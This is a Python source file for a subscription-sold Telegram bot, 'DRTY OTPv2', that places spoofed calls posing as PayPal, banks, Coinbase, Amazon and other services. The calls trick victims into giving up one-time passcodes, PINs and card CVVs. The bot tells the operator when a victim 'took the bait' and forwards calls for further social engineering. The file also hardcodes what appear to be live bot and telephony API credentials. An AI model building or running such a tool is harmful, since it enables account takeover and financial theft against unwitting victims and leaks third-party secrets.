import threading
import json
import time
import os
import requests
from flask import Flask, request
from telegram import Bot, Update, ParseMode
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
from discord_webhook import DiscordWebhook, DiscordEmbed
from plivo import RestClient

# Importar lógica interna
import callhandler
import keyhandler

# ==========================================
# CONFIGURACIÓN (Rellena esto)
# ==========================================
BOT_TOKEN = "8576687800:AAH5J_1MXZFx68rncmAkLs1rRtgWIZqdjiM"
DISCORD_WEBHOOK_URL = "DISCORD_WEBKOOK_HERE"
PLIVO_ID = "MAODFIMTUYNJI0OWZHOG"
PLIVO_TOKEN = "ZDJhMTMxZWJjZGU3MTE0MTYxMWRhZWVmNzhkYjg4"

# IDs de administradores (Extraídos de tu código original)
ADMIN_IDS = [934491540, 5129223108]

app = Flask(__name__)
bot_instance = Bot(token=BOT_TOKEN)
plivo_client = RestClient(PLIVO_ID, PLIVO_TOKEN)

# ==========================================
# FUNCIONES AUXILIARES
# ==========================================

def has_access(user_id):
    try:
        if not os.path.exists("keys/redeemedKeys.json"): return False
        with open("keys/redeemedKeys.json", "r") as f:
            key_log = json.load(f)
        str_id = str(user_id)
        # Verifica si existe y si el tiempo es mayor al actual
        if str_id in key_log and key_log[str_id] > int(time.time()):
            return True
        return False
    except:
        return False

def convert_time(seconds):
    seconds = int(seconds)
    days = seconds // (3600 * 24)
    hours = (seconds % (3600 * 24)) // 3600
    minutes = (seconds % 3600) // 60
    sec = seconds % 60
    
    text = ""
    if days > 0: text += f"{days} day(s), " if days == 1 else f"{days} days, "
    if hours > 0: text += f"{hours} hour(s), "
    if minutes > 0: text += f"{minutes} minute(s) and "
    text += f"{sec} second(s)"
    return text

def log_discord(user_name, user_id, command, full_message):
    try:
        # Generar link al perfil (como en tu JS)
        user_link = f"https://t.me/{user_name}"
        
        embed = DiscordEmbed(title=f"{user_name} ran the command {command}", color='00b0f4')
        embed.add_embed_field(name='User ID', value=str(user_id), inline=True)
        embed.add_embed_field(name='Username', value=str(user_name), inline=True)
        embed.add_embed_field(name='Command', value=str(command), inline=True)
        embed.add_embed_field(name='Full Message', value=str(full_message), inline=False)
        embed.set_url(user_link)
        embed.set_timestamp()
        
        webhook = DiscordWebhook(url=DISCORD_WEBHOOK_URL)
        webhook.add_embed(embed)
        webhook.execute()
    except:
        pass

# ==========================================
# WEBHOOK FLASK (Responde a Plivo)
# ==========================================
@app.route('/test', methods=['POST'])
def webhook():
    # Plivo suele enviar datos como Form (req.body en express con body-parser)
    data = request.form if request.form else request.json
    
    # 1. Verificar eventos de estado
    if data and (data.get('caller') or data.get('userid')):
        chat_id = data.get('caller') or data.get('userid')
        type_of = data.get('type')
        
        if type_of == "answered":
            bot_instance.send_message(chat_id, "<b>📞 Call Answered</b>\nThe call was answered by the Target.", parse_mode=ParseMode.HTML)
        
        elif type_of == "pressPin":
            bot_instance.send_message(chat_id, "<b>📨 Awaiting Pin</b>\nThe callee took the bait, now let's see if they send their pin.", parse_mode=ParseMode.HTML)
            
        elif type_of == "success" and data.get('code'):
            code = data.get('code').replace("#", "").replace("*", "")
            bot_instance.send_message(chat_id, f"<b>💸 Code Obtained</b>\n📱 - <code>{code}</code>.", parse_mode=ParseMode.HTML)
            
        elif type_of == "failed" or type_of == "noInput":
            bot_instance.send_message(chat_id, "<b>⚠️ Code Unobtained</b>\nThe OTP code was not obtained from the callee.", parse_mode=ParseMode.HTML)
            
        elif type_of == "sendotp":
            bot_instance.send_message(chat_id, "<b>📨 Send OTP</b>\nThe callee has fallen for the bait, now it's time to send the OTP to their SMS.", parse_mode=ParseMode.HTML)
            
        elif type_of == "invalid":
            bot_instance.send_message(chat_id, f"<b>⚠️ Invalid OTP Capture</b>\nThe capture type `{data.get('typeOf')}` is not a valid entry.", parse_mode=ParseMode.HTML)
            
        elif type_of == "forwarded":
            to_num = data.get('to', 'unknown')
            bot_instance.send_message(chat_id, f"<b>➡️ Forwarding Call</b>\nThe callee has fallen for the bait, and now the call is being forwarded to <code>{to_num}</code>.", parse_mode=ParseMode.HTML)
            
        elif type_of == "forwardAnswered":
            bot_instance.send_message(chat_id, "<b>🙌 Forward Success</b>\nThe call was forwarded, now it's your chance to socially engineer the victim.", parse_mode=ParseMode.HTML)
            
        elif type_of == "noAnswer":
            bot_instance.send_message(chat_id, "<b>⚠️ No Answer</b>\nThe call was not answered.", parse_mode=ParseMode.HTML)

    # 2. Manejo de Grabaciones (Response)
    if data.get('response'):
        try:
            resp_json = json.loads(data.get('response'))
            if resp_json.get('recording_id'):
                rec_id = resp_json.get('recording_id')
                call_uuid = resp_json.get('call_uuid')
                url = f"https://media.plivo.com/v1/Account/{PLIVO_ID}/Recording/{rec_id}.mp3"
                
                # Buscar dueño de la llamada
                if os.path.exists('calls/current.json'):
                    with open('calls/current.json', 'r') as f: current = json.load(f)
                    for uid, info in current.items():
                        if info[1] == call_uuid:
                            bot_instance.send_message(uid, f'📜 The transcript was captured for this call, click <a href="{url}">here</a>.', parse_mode=ParseMode.HTML)
        except:
            pass

    # 3. Evento de Colgado (Hangup) y Costos
    if data.get('Event') == 'Hangup':
        cost = data.get('TotalCost', '0.00000')
        if cost != "0.00000":
            try:
                # Obtener créditos restantes
                acct = plivo_client.account.get()
                credits_left = acct['cash_credits']
                
                embed = DiscordEmbed(title="Plivo Credit", color="fff600")
                embed.add_embed_field(name="Description", value=f"**{cost}** 🪙 was used, there is now **{credits_left}** 🪙 remaining.")
                
                webhook = DiscordWebhook(url=DISCORD_WEBHOOK_URL)
                webhook.add_embed(embed)
                webhook.execute()
            except:
                pass

    return "OK", 200

# ==========================================
# COMANDOS DEL BOT
# ==========================================

# Handler genérico para evitar repetir código
def process_call_command(update, context, spoof=None, service=None, length=None, module="3", forward=False):
    msg = update.message
    txt = msg.text
    cmd_used = txt.split()[0]
    args = txt.replace(cmd_used, "").split()
    
    if not has_access(msg.from_user.id):
        msg.reply_text("You don't have access. You can purchase a subscription at our <a href='https://generaly.atshop.io/'>shop.</a>", parse_mode=ParseMode.HTML)
        return

    # Caso: Comandos predefinidos (/paypal, /venmo...) (Requieren 2 argumentos: target, name)
    if spoof and service:
        if len(args) >= 2:
            target = args[0]
            name = args[1]
            msg.reply_text(f"<b>📲Initiating call to</b> <code>{target}</code> <b>from</b> <code> {spoof}</code>.", parse_mode=ParseMode.HTML)
            callhandler.make_call(target, name, spoof, service, length, msg, module, None, None)
        elif len(args) == 1:
            msg.reply_text(f"Only 1 of 2 fields were entered.\n<b>Usage: {cmd_used} {{target 📞}} {{targetname}}</b>", parse_mode=ParseMode.HTML)
        else:
            msg.reply_text(f"Only 0 of 2 fields were entered.\n<b>Usage: {cmd_used} {{target 📞}} {{targetname}}</b>", parse_mode=ParseMode.HTML)
    
    # Caso: /call normal (Requiere 5 argumentos)
    elif not forward: 
        if len(args) == 5:
            # args: target, name, spoof, service, length
            msg.reply_text(f"<b>📲Initiating call to</b> <code>{args[0]}</code> <b>from</b> <code>{args[2]}</code>.", parse_mode=ParseMode.HTML)
            callhandler.make_call(args[0], args[1], args[2], args[3], args[4], msg, "3", None, None)
        elif len(args) >= 1:
            msg.reply_text(f"Only {len(args)} of 5 fields were entered.\n<b>Usage: /call {{target 📞}} {{targetname}} {{spoof 📞}} {{spoofname}} {{otplength}}</b>", parse_mode=ParseMode.HTML)
        else:
            msg.reply_text(f"Only 0 of 5 fields were entered.\n<b>Usage: /call {{target 📞}} {{targetname}} {{spoof 📞}} {{spoofname}} {{otplength}}</b>", parse_mode=ParseMode.HTML)

    # Caso: /forwardcall (Requiere 5 argumentos, ultimo es forward)
    else:
        if len(args) == 5:
             # args: target, name, spoof, service, forward_number
            msg.reply_text(f"<b>📲Initiating call to</b> <code>{args[0]}</code> <b>from</b> <code>{args[2]}</code>.", parse_mode=ParseMode.HTML)
            callhandler.make_call(args[0], args[1], args[2], args[3], "0", msg, "4", args[4], null)
        elif len(args) >= 1:
            msg.reply_text(f"Only {len(args)} of 5 fields were entered.\n<b>Usage: /forwardcall {{target 📞}} {{targetname}} {{spoof 📞}} {{spoofname}} {{forward 📞}}</b>", parse_mode=ParseMode.HTML)
        else:
            msg.reply_text(f"Only 0 of 5 fields were entered.\n<b>Usage: /forwardcall {{target 📞}} {{targetname}} {{spoof 📞}} {{spoofname}} {{forward 📞}}</b>", parse_mode=ParseMode.HTML)

# Wrappers para los comandos
def cmd_call(u, c): process_call_command(u, c)
def cmd_forwardcall(u, c): process_call_command(u, c, forward=True)
def cmd_paypal(u, c): process_call_command(u, c, spoof="+1(888)221-1161", service="paypal", length="6", module="33")
def cmd_venmo(u, c): process_call_command(u, c, spoof="+1(855)812-4430", service="/venmo", length="6")
def cmd_coinbase(u, c): process_call_command(u, c, spoof="+1(888)908-7930", service="coinbase", length="7")
def cmd_amazon(u, c): process_call_command(u, c, spoof="+1(888)908-7930", service="amazon", length="7")
def cmd_bank(u, c): process_call_command(u, c, spoof="+1(855)812-4430", service="/bank", length="6")
def cmd_cashapp(u, c): process_call_command(u, c, spoof="+1(855)812-4430", service="/cashapp", length="6")
def cmd_applepay(u, c): process_call_command(u, c, spoof="+1(888)908-7930", service="applepay", length="7")
def cmd_email(u, c): process_call_command(u, c, spoof="+1(888)908-7930", service="email", length="7")
def cmd_crypto(u, c): process_call_command(u, c, spoof="+1(888)908-7930", service="Crypto", length="7")

# Pin y Cvv usan logica especial en tus parametros (module "5" y "2")
def cmd_pin(u, c):
    msg = u.message; args = msg.text.replace("/pin", "").split()
    if not has_access(msg.from_user.id):
        msg.reply_text("You don't have access.", parse_mode=ParseMode.HTML); return
    
    if len(args) == 4:
        msg.reply_text(f"<b>📲Initiating call to</b> <code>{args[0]}</code> <b>from</b> <code>{args[2]}</code>.", parse_mode=ParseMode.HTML)
        callhandler.make_call(args[0], args[1], args[2], args[3], "0", msg, "5", None, None)
    else:
        msg.reply_text("Usage: /pin {target 📞} {targetname} {spoof 📞} {spoofname}", parse_mode=ParseMode.HTML)

def cmd_cvv(u, c):
    msg = u.message; args = msg.text.replace("/cvv", "").split()
    if not has_access(msg.from_user.id):
        msg.reply_text("You don't have access.", parse_mode=ParseMode.HTML); return
    
    if len(args) == 5:
        msg.reply_text(f"<b>📲Initiating call to</b> <code>{args[0]}</code> <b>from</b> <code>{args[2]}</code>.", parse_mode=ParseMode.HTML)
        callhandler.make_call(args[0], args[1], args[2], args[3], args[4], msg, "2", None, None)
    else:
        msg.reply_text("Usage: /cvv {target 📞} {targetname} {spoof 📞} {spoofname} {last4ccn}", parse_mode=ParseMode.HTML)

def cmd_createscript(u, c):
    # En tu codigo original esto era igual a /pin pero con module "5"
    cmd_pin(u, c)

# --- Comandos informativos ---
def cmd_scripts(u, c):
    txt = """Available scripts:

/paypal - Shortcut for PayPal OTP
/venmo - Shortcut for Venmo OTP
/amazon - Approval Authorization
/bank - Shortcut for Bank OTP
/coinbase - Shortcut for Coinbase OTP
/cashapp - Capture code for Cashapp
/ApplePay - Capture Code for ApplePay
/email - Capture Code for email
/crypto - More advanced Crypto Script-Works for everything
/Call - Capture Any Code
/pin - Capture ANY digit PIN
/cvv - Capture cvv code from credit/debit card
/cvv2 - Capture Debit/Credit Card Details & PIN
"""
    u.message.reply_text(txt)

def cmd_guide(u, c):
    txt = """To use the /paypal command, follow these steps:
1. Send the command /paypal to the bot.
2. Enter the required parameters, such as the OTP code digits, the target name, number, (and if needed the spoof number) or any additional information.
3. Press Enter or Send to execute the command.
4. Wait for the response from the bot, which will provide the result of the command.

Example: /paypal target number (spoof number) digits (target name)"""
    u.message.reply_text(txt, parse_mode=ParseMode.HTML)

def cmd_start(u, c):
    txt = """DRTY OTPv2  COMMANDS 
    📞 CALL COMMANDS
    ☎️ | /call - Start a call    
    🅿️ | /paypal - Shortcut for PayPal OTP
    💻 | /venmo - Shortcut for Venmo OTP
    📦 | /amazon - Approval Authorization
    🏦 | /bank - Shortcut for Bank OTP
    🪙  | /coinbase - Shortcut for Coinbase OTP
    💰 | /cashapp - Capture code for Cashapp
    🍏 | /applepay - Capture Code for ApplePay
    📧 | /email - Capture Code for email
    🪙 | /crypto - More advanced Crypto Script
    📲  | /call - Capture Any Code
    🏧  | /pin - Capture ANY digit PIN
    💳 | /cvv - Capture cvv code from credit/debit card
    🤖 | /scripts - List all scripts
    🏦 | /bank - Shortcut for bank otp
    📞 | /forwardcall - forwads call to target

    OTHER COMMANDS
    🔑 | /redeem - Redeem License to your account
    ⏰ | /plan - Check subscription remaining time
     
    🤖 BOT COMMANDS
    ❓ | /help Commands - Shows this message
    📡 | /ping - returns the latency ping 🟢🟡🔴
      
    Supports 🇺🇸🇨🇦
     
    ✨ CUSTOM COMMANDS
    ✨ | /createscript - Just like /call but with your script
     
    BOT USER: @DRTY_OTP_BOTv2
     
    CHAT: @DRTY_OTPv2_CHAT
     
    VOUCHERS: @DRTYOTPv2_VOUCHES"""
    u.message.reply_text(txt, parse_mode=ParseMode.HTML)

# --- Comandos de Sistema / Keys ---
def cmd_ping(u, c):
    s = time.time()
    m = u.message.reply_text("Pinging...")
    e = time.time()
    lat = int((e-s)*1000)
    stat = "🟢 Low latency" if lat<50 else ("🟡 Medium latency" if lat<200 else "🔴 High latency")
    m.edit_text(f"Latency: {lat}ms\nStatus: {stat}")

def cmd_redeem(u, c):
    msg = u.message
    try:
        key = msg.text.split()[1]
        res = keyhandler.redeem_key(key, msg.from_user.id)
        if res[0]:
            msg.reply_text(f"Your key was redeemed for <b>{res[1]}</b> of access.", parse_mode=ParseMode.HTML)
        else:
            msg.reply_text("You have entered an invalid key.", parse_mode=ParseMode.HTML)
    except:
        msg.reply_text("Usage: /redeem {key}", parse_mode=ParseMode.HTML)

def cmd_plan(u, c):
    uid = u.message.from_user.id
    if has_access(uid):
        with open("keys/redeemedKeys.json","r") as f: d=json.load(f)
        left = d[str(uid)] - int(time.time())
        u.message.reply_text(f"You have <b>{convert_time(left)}</b> left on your subscription.", parse_mode=ParseMode.HTML)
    else:
        u.message.reply_text("You don't have access. You can purchase a subscription at <a href='https://generaly.atshop.io/'>here.</a>", parse_mode=ParseMode.HTML)

# Admin
def cmd_genkey(u, c):
    if u.message.from_user.id in ADMIN_IDS:
        try:
            d = u.message.text.split()[1]
            k = keyhandler.create_key(d)
            u.message.reply_text(str(k))
        except: pass

def cmd_genkeyhour(u, c):
    if u.message.from_user.id in ADMIN_IDS:
        k = keyhandler.create_hour()
        u.message.reply_text(str(k))

def cmd_genkeybulk(u, c):
    if u.message.from_user.id in ADMIN_IDS:
        try:
            d = u.message.text.split()[1]
            keyhandler.bulk_create(d)
            u.message.reply_text("<b>The keys were successfully created.</b>", parse_mode=ParseMode.HTML)
        except: pass

# Logger general
def log_message(u, c):
    user = u.effective_user
    msg = u.message.text
    if msg:
        cmd = msg.split()[0]
        log_discord(user.first_name, user.id, cmd, msg)

# ==========================================
# EJECUCIÓN
# ==========================================
def run_flask():
    port = int(os.environ.get('PORT', 88))
    app.run(host='0.0.0.0', port=port)

def main():
    # Hilo para Flask
    t = threading.Thread(target=run_flask)
    t.daemon = True
    t.start()

    # Bot
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    # Registro de comandos
    dp.add_handler(CommandHandler(["start", "help"], cmd_start))
    dp.add_handler(CommandHandler("scripts", cmd_scripts))
    dp.add_handler(CommandHandler("guide", cmd_guide))
    dp.add_handler(CommandHandler("ping", cmd_ping))
    
    # Calls
    dp.add_handler(CommandHandler("call", cmd_call))
    dp.add_handler(CommandHandler("forwardcall", cmd_forwardcall))
    dp.add_handler(CommandHandler("paypal", cmd_paypal))
    dp.add_handler(CommandHandler("venmo", cmd_venmo))
    dp.add_handler(CommandHandler("coinbase", cmd_coinbase))
    dp.add_handler(CommandHandler("amazon", cmd_amazon))
    dp.add_handler(CommandHandler("bank", cmd_bank))
    dp.add_handler(CommandHandler("cashapp", cmd_cashapp))
    dp.add_handler(CommandHandler("applepay", cmd_applepay))
    dp.add_handler(CommandHandler("email", cmd_email))
    dp.add_handler(CommandHandler("crypto", cmd_crypto))
    dp.add_handler(CommandHandler("pin", cmd_pin))
    dp.add_handler(CommandHandler("cvv", cmd_cvv))
    dp.add_handler(CommandHandler("createscript", cmd_createscript))

    # Keys
    dp.add_handler(CommandHandler("redeem", cmd_redeem))
    dp.add_handler(CommandHandler("plan", cmd_plan))
    dp.add_handler(CommandHandler("genkey", cmd_genkey))
    dp.add_handler(CommandHandler("genkeyhour", cmd_genkeyhour))
    dp.add_handler(CommandHandler("genkeybulk", cmd_genkeybulk))

    # Logger
    dp.add_handler(MessageHandler(Filters.text, log_message))

    print("Bot is running...")
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
